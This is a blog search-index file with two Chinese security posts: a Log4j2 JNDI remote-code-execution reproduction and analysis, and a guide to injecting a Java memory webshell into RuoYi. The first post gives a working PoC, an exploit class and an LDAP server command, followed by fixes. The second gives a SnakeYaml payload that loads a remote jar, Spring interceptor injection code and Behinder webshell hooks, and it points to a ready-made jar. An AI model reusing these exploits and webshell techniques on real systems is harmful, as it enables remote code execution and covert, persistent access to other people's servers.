<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Log4j2 远程代码执行漏洞</title>
      <link href="/2021/12/10/Log4j2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/12/10/Log4j2-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h2><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><p>Apache Log4j 2.x &lt;= 2.14.1</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://localhost:8087/Exploit&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>编译恶意类，并开一个 http 服务，使能够通过 http 服务访问到恶意类 <code>python -m http.server 8000</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Pwned&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String cmds = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">            Runtime.getRuntime().exec(cmds);</span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 marshalsec 开一个LDAP服务，运行POC即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://127.0.0.1:8000/#Exploit&quot;</span> <span class="number">8087</span></span><br></pre></td></tr></table></figure><p><img src="http://image.lz2y.top/image-20211210094255327.png" alt="image-20211210094255327"></p><p>或者直接使用 <a href="https://github.com/0x727/JNDIExploit">https://github.com/0x727/JNDIExploit</a> 开启JNDI 服务</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>主要在 <code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code> 中，遍历所有需要记录的日志，如果遇到了 <code>$&#123;</code>，则调用 <code>org.apache.logging.log4j.core.lookup.StrSubstitutor#replace</code> 来进行一个替换操作</p><p><img src="http://image.lz2y.top/image-20211210094848659.png" alt="image-20211210094848659"></p><p>会调用 <code>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute</code></p><p><img src="http://image.lz2y.top/image-20211210095145216.png" alt="image-20211210095145216"></p><p>跟进一下，发现前面是一些字符查找操作，后面会进行一个变量解析操作</p><p><img src="http://image.lz2y.top/image-20211210095537300.png" alt="image-20211210095537300"></p><p><code>org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable</code> 先获得变量解析器，然后调用 解析器的 <code>lookup</code> 方法</p><p><img src="http://image.lz2y.top/image-20211210095717936.png" alt="image-20211210095717936"></p><p>会根据 <code>:</code> 前面的字符来获得对应的解析器，最后调用 <code>lookup</code></p><p><img src="http://image.lz2y.top/image-20211210100656850.png" alt="image-20211210100656850"></p><p>如果我们使用的是 <code>jndi:ldap://localhost:8087/Exploit</code> ，则会获得 <code>JndiLookup</code> 作为解析器，并把 <code>ldap://localhost:8087/Exploit</code> 作为 uri 发起 jndi 请求</p><p><img src="http://image.lz2y.top/image-20211210092000949.png" alt="image-20211210092000949"></p><h3 id="高jdk版本利用"><a href="#高jdk版本利用" class="headerlink" title="高jdk版本利用"></a>高jdk版本利用</h3><p>当然jndi注入都是有版本限制的，在 JDK 6u211，7u201, 8u191, 11.0.1开始<br><code>com.sun.jndi.ldap.object.trustURLCodebase</code> 属性的默认值被调整为false，导致LDAP远程代码攻击方式开始失效</p><p>但是可以通过触发本地的gadget，比较常用的是 Tomcat</p><p>可参考</p><ul><li><a href="https://xz.aliyun.com/t/10035#toc-4">https://xz.aliyun.com/t/10035#toc-4</a></li><li><a href="https://paper.seebug.org/942/#4-jdk-8u191">https://paper.seebug.org/942/#4-jdk-8u191</a></li></ul><p>利用工具 <a href="https://github.com/0x727/JNDIExploit">https://github.com/0x727/JNDIExploit</a> 里面有一些绕过</p><h2 id="0x05-修复方式"><a href="#0x05-修复方式" class="headerlink" title="0x05 修复方式"></a>0x05 修复方式</h2><ul><li>排查应用是否引入了Apache Log4j2 Jar包，若存在依赖引入，则可能存在漏洞影响。请尽快升级Apache Log4j2所有相关应用到最新的 log4j-2.15.0-rc2 版本，地址 <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></li><li>升级已知受影响的应用及组件，如 spring-boot-starter-log4j2/Apache Struts2/Apache Solr/Apache Druid/Apache Flink</li><li>设置jvm参数 “-Dlog4j2.formatMsgNoLookups=true”</li><li>设置“log4j2.formatMsgNoLookups=True”</li><li>系统环境变量“FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS”设置为“true”</li><li>关闭对应应用的网络外连，禁止主动外连</li></ul><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ul><li><a href="https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw">https://mp.weixin.qq.com/s/9f1cUsc1FPIhKkl1Xe1Qvw</a></li><li><a href="https://mp.weixin.qq.com/s/wC7mrK1Y4DYz9_yW4fLzbw">https://mp.weixin.qq.com/s/wC7mrK1Y4DYz9_yW4fLzbw</a></li><li><a href="https://mp.weixin.qq.com/s/xEG0ujl443AkbYV9DW0uhg">https://mp.weixin.qq.com/s/xEG0ujl443AkbYV9DW0uhg</a></li><li><a href="https://github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RuoYi可用内存马</title>
      <link href="/2021/11/27/RuoYi%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2021/11/27/RuoYi%E5%8F%AF%E7%94%A8%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间有师傅在群里问“若依怎么利用 SnakeYaml 反序列化漏洞注入内存马”，当时觉得直接注入SpringBoot的Interceptor类内存马即可。 但是后来发现事情没有那么简单，本篇博客用于记录自己踩的坑。</p><p>如果不想看分析可拉到最后，已给出可用 jar 包及构造使用的项目。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里简单看一下 RuoYi 触发 SnakeYaml 反序列化漏洞的漏洞点。</p><p>漏洞点在后台 系统监控 &gt; 定时任务 处，可以调用类的方法</p><p><img src="http://image.lz2y.top/image-20211127160033485.png" alt="image-20211127160033485"></p><p>系统会调用 <code>com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod</code> 方法来处理系统任务</p><p>首先会获取需要执行的目标，即我们的 payload，再获取实例名和方法名以及方法参数</p><p>然后判断实例名是否是 带完全包名称的类名，如果不是的话，则调用 <code>SpringUtils.getBean(beanName)</code> 获得实例；如果是的话，则使用 <code>Class.forName(beanName).newInstance()</code> 获得实例</p><p>最后调用 <code>invokeMethod(SysJob sysJob)</code> 方法实现方法的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">invokeMethod</span><span class="params">(SysJob sysJob)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       String invokeTarget = sysJob.getInvokeTarget();</span><br><span class="line">       String beanName = getBeanName(invokeTarget);</span><br><span class="line">       String methodName = getMethodName(invokeTarget);</span><br><span class="line">       List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!isValidClassName(beanName))</span><br><span class="line">       &#123;</span><br><span class="line">           Object bean = SpringUtils.getBean(beanName);</span><br><span class="line">           invokeMethod(bean, methodName, methodParams);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">           Object bean = Class.forName(beanName).newInstance();</span><br><span class="line">           invokeMethod(bean, methodName, methodParams);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod</code> 可以看到这里通过 <code>getDeclaredMethod</code> 获得了类的方法，然后通过反射执行方法。</p><p><img src="http://image.lz2y.top/image-20211127162253987.png" alt="image-20211127162253987"></p><p>当我们传入的类名为完全包名称，需要满足三个条件才能正常使用</p><ul><li>具有无参构造方法</li><li>调用的方法需要是类自身声明的方法，不能是他的父类方法</li><li>构造方法和调用的方法均为 public</li></ul><p>而 <code>org.yaml.snakeyaml.Yaml</code>  是符合这些条件的，我们可以利用这个点去触发 SnakeYaml 反序列化漏洞，而 SnakeYaml 反序列化漏洞具体分析和利用方法，可以参考 <a href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Mi1k7ea 师傅的文章</a>，这里就不多赘述。</p><p>以下测试我都使用一下payload，其他利用方法改改即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(<span class="string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;you_url_of_jar&quot;]]]]&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="第一代马儿"><a href="#第一代马儿" class="headerlink" title="第一代马儿"></a>第一代马儿</h2><p>首先我使用把 <a href="https://github.com/bitterzzZZ/MemoryShellLearn/blob/main/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/spring-controller-interceptor/TestInterceptor.java">bitterzzZZ师傅写的马儿</a> 的逻辑放到恶意类中，在获取上下文环境时就报错了，主要是因为这里的触发点为定时任务，触发点和Web服务不在同一个线程（大概是这个意思）</p><p><img src="http://image.lz2y.top/image-20211127164859268.png" alt="image-20211127164859268"></p><p>知道了原因就是解决问题了，主要思路是利用别的方法获得上下文环境，第一时间想到的是LandGrey师傅 <a href="https://landgrey.me/blog/19/">利用 intercetor 注入 spring 内存 webshell</a>  给出的另一种获得   ApplicationContext 的方法，通过反射获得 <code>LiveBeansView</code> 类的属性，通过这个属性值来获取 ApplicationContext 总可以了吧（而且版本也是符合的）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span></span><br><span class="line">java.lang.reflect.Field filed = Class.forName(<span class="string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContexts&quot;</span>);</span><br><span class="line"><span class="comment">// 2. 属性被 private 修饰，所以 setAccessible true</span></span><br><span class="line">filed.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 3. 获取一个 ApplicationContext 实例</span></span><br><span class="line">org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="keyword">null</span>)).iterator().next();</span><br><span class="line"><span class="comment">// 4. 获得 adaptedInterceptors 属性值</span></span><br><span class="line">org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(<span class="string">&quot;requestMappingHandlerMapping&quot;</span>);</span><br><span class="line">java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);</span><br></pre></td></tr></table></figure><p>更换代码后没啥问题，能够正常注入内存马，在此基础上加上了删除马儿和冰蝎逻辑后就上传到 <a href="https://github.com/lz2y/yaml-payload-for-ruoyi/releases/tag/v1">GitHub</a>，以为此事就此结束</p><h2 id="第二代马儿"><a href="#第二代马儿" class="headerlink" title="第二代马儿"></a>第二代马儿</h2><p>过了十来天，有师傅说我的马儿在 linux 系统下运行的 RuoYi 注入不进去，具体情况如下：</p><ul><li>测试版本为 RUOYI-VUE 3.6 </li><li>在 Windows 可注入内存马，但是自己打包的 jar 包不行</li><li>在 Linux 中无法注入内存马</li></ul><p>看了一下RuoYi-VUE 3.6 和我测试版本 RuoYi 4.6 的 Spring Boot 和 Srping都是相同的，按理来说都一样才对</p><h3 id="打包问题"><a href="#打包问题" class="headerlink" title="打包问题"></a>打包问题</h3><p>首先要了一份他打包的 jar 包，发现 jar 包结构有点问题。前面那个是我使用 maven 打包，能够正常使用的 jar 包，是符合 SPI 机制的。而后面那个则是通过 <code>Project Structure &gt; Project Settsings &gt; Aritifacts</code> 打包的，把依赖也打包进来了，而关键的文件则没有在正确的位置。使用 maven 打包项目即可解决该问题</p><p><img src="http://image.lz2y.top/image-20211128235143009.png" alt="image-20211128235143009"></p><h3 id="新的获得-ApplicationContext-方法"><a href="#新的获得-ApplicationContext-方法" class="headerlink" title="新的获得 ApplicationContext 方法"></a>新的获得 ApplicationContext 方法</h3><p>然后是在 linux 中无法使用的问题，通过查看报错信息可以了解到是在获得上下文环境时出现了问题</p><p><img src="http://image.lz2y.top/image-20211129000747807.png" alt="image-20211129000747807"></p><p>通过对比可以发现（左 linux 右 windows），在 linux 环境下 <code>org.springframework.context.support.LiveBeansView</code> 类 <code>applicationContexts</code> 属性中确实没有我们想要的值</p><p><img src="http://image.lz2y.top/image-20211129003822639.png" alt="image-20211129003822639"></p><p>找一下注册逻辑（左 linux 右 windows）发现在 linux 环境下 <code>mbeanDomain</code> 为 null，导致他不会把我们的 ApplicationContext 放入 <code>applicationContexts</code> 属性中</p><p><img src="http://image.lz2y.top/image-20211129003739019.png" alt="image-20211129003739019"></p><p>虽然不知道啥原因导致 <code>mbeanDomain</code>  不同，但是估计得找一个新的方法获得 ApplicationContext </p><p>我把这个问题丢给 <a href="https://github.com/Er1cccc">r2师傅</a> 后，他找了一会后给了我个在若依能够使用的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field f = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;com.ruoyi.common.utils.spring.SpringUtils&quot;</span>).getDeclaredField(<span class="string">&quot;applicationContext&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">org.springframework.web.context.WebApplicationContext context =(org.springframework.web.context.WebApplicationContext)f.get(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure><p>他主要是通过 dump 内存后发现有个成色不错的类，正好符合我们的需求</p><p><img src="http://image.lz2y.top/image-20211129081716393.png" alt="image-20211129081716393"></p><p>在启动阶段会把 applicationContext 赋值到他的 <code>applicationContext </code> 属性中，且该属性被 <code>static</code> 修饰</p><p><img src="http://image.lz2y.top/image-20211209144154434.png" alt="image-20211209144154434"></p><p>后面使用 <a href="https://github.com/c0ny1/java-object-searcher">java-object-searcher</a>，也找到了合适的获得  ApplicationContext 方法</p><p><img src="http://image.lz2y.top/image-20211209221524847.png" alt="image-20211209221524847"></p><p><img src="http://image.lz2y.top/image-20211209222012087.png" alt="image-20211209222012087"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Field field = Thread.currentThread().getClass().getDeclaredField(<span class="string">&quot;runnable&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj = field.get(Thread.currentThread());</span><br><span class="line">field = obj.getClass().getDeclaredField(<span class="string">&quot;qs&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">obj = field.get(obj);</span><br><span class="line">field = obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">obj = field.get(obj);</span><br><span class="line">Map m = (Map) obj;</span><br><span class="line">org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext)m.get(<span class="string">&quot;applicationContextKey&quot;</span>);</span><br></pre></td></tr></table></figure><p>修改之后就能用了</p><h3 id="加载器问题"><a href="#加载器问题" class="headerlink" title="加载器问题"></a>加载器问题</h3><p>但是在此过程中，<strong>又有一个问题</strong>：</p><p>当时我在测试 linux 环境下时使用的是在 linux 下跑运行 <code>ruoyi-admin.jar</code>（官方给的运行方法也是运行 jar 包），发现在 payload 运行到获取上下文前就抛出异常了，查了一遍发现是在继承 <code>HandlerInterceptorAdapter</code> 时无法找到  <code>HandlerInterceptorAdapter</code> 这个类，这就有点奇怪了，在加载过程中是正常的，在继承的时候就找不到了。</p><p><img src="http://image.lz2y.top/image-20211125230620012.png" alt="image-20211129102800363"></p><p>后来发现是加载器问题，可参考 <a href="https://hengyun.tech/spring-boot-classloader/">深入Spring Boot：ClassLoader的继承关系和影响</a> </p><blockquote><ol><li><p>在IDE里，直接run main函数<br>则Spring的ClassLoader直接是SystemClassLoader。ClassLoader的urls包含全部的jar和自己的target/classes</p></li><li><p>以fat jar运行</p><p>执行应用的main函数的ClassLoader是<code>LaunchedURLClassLoader</code>，它的parent是<code>SystemClassLoader</code>。</p><p>并且<code>LaunchedURLClassLoader</code>的urls是 fat jar里的<code>BOOT-INF/classes!/</code>目录和<code>BOOT-INF/lib</code>里的所有jar。</p></li></ol></blockquote><p>看一下 <code>HandlerInterceptor</code> 和 <code>HandlerInterceptorAdapter</code> 存在于 <code>spring-webmvc-5.2.12.RELEASE.jar</code> ，存放于 <code>BOOT-INF/lib</code> 下。</p><p>当我们以fat jar运行时，使用的是 <code>LaunchedURLClassLoader</code> ，所以在程序运行过程中是能够找到该类的</p><p><img src="http://image.lz2y.top/image-20211209165339829.png" alt="image-20211209165339829"></p><p><img src="http://image.lz2y.top/image-20211209170303759.png" alt="image-20211209170303759"></p><p>那为什么我们的恶意类去继承 <code>HandlerInterceptorAdapter</code>  时找不到该类呢</p><p>这里大概看一下寻找 <code>HandlerInterceptorAdapter</code> 的过程</p><p>可以看到，这里使用的是 <code>URLClassLoader</code> 作为类加载器</p><p><img src="http://image.lz2y.top/image-20211209170745871.png" alt="image-20211209170745871"></p><p>根据双亲委派模型会去引导类加载器和扩展类加载器找该类，这肯定是找不到的，然后回到 AppClassLoader 来加载类，这里只有一个 <code>ruoyi-admin.jar</code> 包，找不到 <code>HandlerInterceptorAdapter</code></p><p><img src="http://image.lz2y.top/image-20211209193836108.png" alt="image-20211209193836108"></p><p>最后回到 <code>URLClassLoader</code>，他会去我们我们的恶意 jar 包找，这也是找不到的，最后只能抛出 NoClassDefFoundError</p><p><img src="http://image.lz2y.top/image-20211209195635361.png" alt="image-20211209195635361"></p><p>而  <code>LaunchedURLClassLoader</code> 中则会去 <code>spring-webmvc.jar</code> 中找到我们需要的类</p><p><img src="http://image.lz2y.top/image-20211209200257421.png" alt="image-20211209200257421"></p><p><img src="http://image.lz2y.top/image-20211209200113480.png" alt="image-20211209200113480"></p><p>我们使用 <code>LaunchedURLClassLoader</code> 来加载这个类即可，详见 <a href="https://github.com/lz2y/yaml-payload-for-ruoyi/blob/main/src/main/java/artsploit/AwesomeScriptEngineFactory.java">Github</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader classLoader = (ClassLoader) Thread.currentThread().getContextClassLoader();</span><br><span class="line">Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,<span class="keyword">new</span> Class[] &#123;<span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class&#125;);</span><br><span class="line">defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 获得恶意类字节码</span></span><br><span class="line"><span class="keyword">byte</span>[] bytes = XXXXXX;</span><br><span class="line"><span class="keyword">return</span> (Class&lt;HttpServlet&gt;) defineClass.invoke(classLoader, <span class="keyword">new</span> Object[] &#123;bytes, <span class="number">0</span>, bytes.length&#125;);</span><br></pre></td></tr></table></figure><p>以上加载器继承关系如下</p><p><img src="http://image.lz2y.top/image-20211210164951918.png" alt="image-20211210164951918"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此所有发现的问题已解决，这里总结一下以上比较坑的点：</p><ol><li>反序列化点在定时任务，和以往的在 Web 服务中不同</li><li>windows 和 linux 使用 idea 启动项目时有一些参数值是不一样的，在 windows 中会把 applicationContext 注册到 <code>org.springframework.context.support.LiveBeansView</code>  的 <code>applicationContexts</code> 中，而 linux 环境下则不会</li><li>以 fat jar 运行时使用的是 <code>LaunchedURLClassLoader</code> ，而在 Yaml 中使用 <code>URLClassloader</code> 来加载类，导致 Yaml 加载类过程中找不到 spring 包里的类。</li></ol><p>此外，这里也记录一下其他比较坑的点</p><ol><li><p>在实现冰蝎逻辑后，在测试的时候发现没法触发，后来发现是因为我主页测试的，如果在未登录情况下会跳转到 登陆界面，解决方法是带上cookie使用冰蝎或者直接在登陆界面触发：<code>/login?cmd=1</code> （添加一个 cmd != null 是防止影响其他业务，也可自行修改）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="keyword">null</span> &amp;&amp; request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;      <span class="comment">// for rebeyond</span></span><br><span class="line"><span class="comment">// 冰蝎的逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在 ruoyi-vue 前后端分离版本中，在前端传参后台可能接收不到参数值，比较好的方法就是直接在后端传值</p><p><img src="http://image.lz2y.top/image-20211209205004867.png" alt="image-20211209205004867"></p><p>或者从前端使用api <code>http://localhost/dev-api/?cmd=whoami</code></p><p><img src="http://image.lz2y.top/image-20211209212818781.png" alt="image-20211209212818781"></p></li><li><p>在 ruoyi-vue 前后端分离版本中，在使用冰蝎的时候会有点问题，报错如下图。具体原因和解决方案还未清楚，等我考完试尝试解决一下，知道的大佬也请指教</p><p><img src="http://image.lz2y.top/image-20211210165747126.png" alt="image-20211210165747126"></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
